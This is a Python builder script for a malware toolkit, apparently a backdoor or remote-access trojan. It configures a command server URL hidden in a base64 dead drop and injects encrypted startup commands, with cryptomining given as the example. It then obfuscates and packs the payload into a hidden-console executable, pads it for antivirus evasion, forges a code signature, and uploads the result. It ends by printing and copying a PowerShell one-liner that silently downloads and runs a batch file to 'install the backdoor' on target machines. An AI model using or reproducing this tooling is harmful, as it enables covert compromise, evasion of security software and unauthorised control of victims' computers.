from evasion import increasesize, encrypt
import pyperclip
import requests
import os
from colorama import Fore, Style, init

init(autoreset=True)

print(Fore.CYAN + Style.BRIGHT + """
   ██████╗ ██████╗ ███╗   ███╗██████╗ ██╗██╗     ███████╗██████╗ 
  ██╔════╝██╔═══██╗████╗ ████║██╔══██╗██║██║     ██╔════╝██╔══██╗
  ██║     ██║   ██║██╔████╔██║██████╔╝██║██║     █████╗  ██████╔╝
  ██║     ██║   ██║██║╚██╔╝██║██╔═══╝ ██║██║     ██╔══╝  ██╔═══╝ 
  ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║     ██║███████╗███████╗██║     
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝╚═╝     

""" + Fore.YELLOW + Style.BRIGHT + "         — ADVANCED PAYLOAD COMPILER —" + Style.RESET_ALL)
print(Fore.CYAN + Style.BRIGHT + "This script will compile the payload and obfuscate it for you. \n\n\n" + Style.RESET_ALL)

with open("executor.py", "r") as f:
    build = f.read()
    f.close()
url_old = input(Fore.CYAN + "Enter your server URL with HTTPS/HTTP: " + Style.RESET_ALL)
if url_old.endswith("/"):
    url_old = url_old[:-1] + ""
print(f"{Fore.GREEN}Your SERVER URL is: {url_old}{Style.RESET_ALL}")
print(Fore.GREEN + "Your SERVER URL in base64 is: " + Fore.CYAN + encrypt.to_base64(url_old.encode()) + Style.RESET_ALL)
print(Fore.YELLOW + "Make sure you save this and upload it in a raw text file for the executor to read.")
input(Fore.MAGENTA + "Press enter to continue..." + Style.RESET_ALL)
url = input(Fore.CYAN + "Link to the text file that contains your Server URL.\n" + 
            Fore.YELLOW + "Make sure your ADMIN server URL is in base64 inside the text file.\n" + 
            "The best place to host your text file is GitHub.\n" + Fore.GREEN + "URL: " + Style.RESET_ALL)
if url.endswith("/"):
    url = url[:-1] + ""
if not url.startswith(("http://", "https://")):
    print(Fore.YELLOW + "Is your server a HTTP or a HTTPS server? (HTTP/HTTPS): " + Style.RESET_ALL)
    choice = input().strip().lower()
    if choice == "https":
        print(Fore.CYAN + f"Replacing {url} with https://{url}" + Style.RESET_ALL)
        url = "https://" + url
    elif choice == "http":
        print(Fore.CYAN + f"Replacing {url} with http://{url}" + Style.RESET_ALL)
        url = "http://" + url
command = input(Fore.CYAN + "Would you like to execute any commands upon file startup? e.g cryptominer. Y/N: " + Style.RESET_ALL)
if command.lower() == "y":
    build = build.replace("upon_start = False", "upon_start = True")
    key = encrypt.generate_key()
    build = build.replace("'ENCRYPT_KEY'", str(key))
    cmd = input(Fore.CYAN + "Enter the command you would like to execute: \n" + Style.RESET_ALL)
    cmd = encrypt.encrypt(key, cmd)
    build = build.replace("'COMMAND_UPON_START'", str(cmd))
    with open("keys.txt", "a") as f:
        f.write(f"Key: {key}\n")
        f.close()
build = build.replace("DO_NOT_CHANGE_ME", url)
with open("source.py", "w") as f:
    f.write(build)
    f.close()
obfusc = input(Fore.CYAN + "Would you like to obfuscate the code? Y/N: " + Style.RESET_ALL)

if obfusc.lower() == "y":
    os.system('evasion\obfuscation.py --input source.py --output source.py --include_imports')
    print("Obfuscation complete.")
name = input(Fore.CYAN + "What shall be the name of the executable? " + Style.RESET_ALL)
os.system('del dist\*.exe')
use_icon = input(Fore.CYAN + "Use default icon? Y/N: " + Style.RESET_ALL)
if use_icon.lower() == "y":
    os.system('cls')
    os.system(f"""pyinstaller source.py --noconsole --onefile --icon=resources\icon.ico --name="{name}" """)
    print(Fore.YELLOW + "Appending data for AV evasion." + Style.RESET_ALL)
    increasesize.append_data(f"dist\{name}.exe")
    os.system('cls')
    print(Fore.GREEN + "Your executable is ready. It can be found in the dist directory." + Style.RESET_ALL)
    os.system(f'del *.spec')
else:
    os.system('cls')
    icon = input("Path of the icon.ico to use (relative to this directory): ")
    os.system(f"""pyinstaller source.py --noconsole --onefile --icon={icon} --name="{name}" """)
    print(Fore.YELLOW + "Appending data for AV evasion." + Style.RESET_ALL)
    increasesize.append_data(f"dist\\{name}.exe")
    os.system('del *.spec')
    os.system('cls')
    print(Fore.GREEN + "Your executable is ready. It can be found in the dist directory." + Style.RESET_ALL)
sign = input(Fore.CYAN + "Would you like to sign the executable? Y/N: " + Style.RESET_ALL)
if sign.lower() == "y":
    os.system(f"""evasion\sigthief.py --add --target="dist\{name}.exe" --output="dist\{name}.exe" --sig=evasion\cert""")

def upload_payload(name):
    payloads = os.listdir("dist")
    payload = payloads[0]
    with open(f"dist/{name}.exe", "rb") as f:
        files = {"file": f}
        requests.post(f"{url_old}/savefile", files=files)
    print(Fore.GREEN + "Upload Complete!" + Style.RESET_ALL)
def change_scripts(url):
    scripts = os.listdir("scripts")
    for script in scripts:
        with open(f"scripts/{script}", "r") as f:
            data = f.read()
            f.close()
        data = data.replace("https://server.api", url)
        with open(f"scripts/{script}", "w") as f:
            f.write(data)
            f.close()
    with open("resources\installer.bat", "r") as f:
        data = f.read()
        data = data.replace("https://server.api", url)
        f.close()
    with open("resources\installer.bat", "w") as f:
        f.write(data)
        f.close()
    try:
        requests.post(f"{url_old}/modify", data=url_old)
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
        print(Fore.RED + "Please make sure the server is running and the URL is correct." + Style.RESET_ALL)

change = input(Fore.CYAN + "Would you like to also ADD this URL in the scripts for proper functioning? Y/N: " + Style.RESET_ALL)
if change.lower() == "y":
    change_scripts(url_old)
    print(Fore.GREEN + "URL added to scripts." + Style.RESET_ALL)

if input(Fore.CYAN + "Would you like to upload the payload to the server? Please make sure to turn on the server or else this will not work. Y/N: " + Style.RESET_ALL).lower() == "y":
    try:
        upload_payload(name)
    except Exception as e:
        print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
        print(Fore.YELLOW + "Please make sure the server is running and the URL is correct." + Style.RESET_ALL)

print(Fore.GREEN + "All done. Exiting." + Style.RESET_ALL)
command = f"""powershell -Command "iwr '{url_old}/bat' -OutFile '%TEMP%\\update.bat'; start-process '%TEMP%\\update.bat' -WindowStyle Hidden" """
print(Fore.RED + f"""Run the following command on any machine to install the backdoor!\n\n\n{command} \n\n\nThis will install and run the backdoor on the target machine.""" + Style.RESET_ALL)
print(Fore.YELLOW + "This command has been copied to your clipboard." + Style.RESET_ALL)
pyperclip.copy(command)


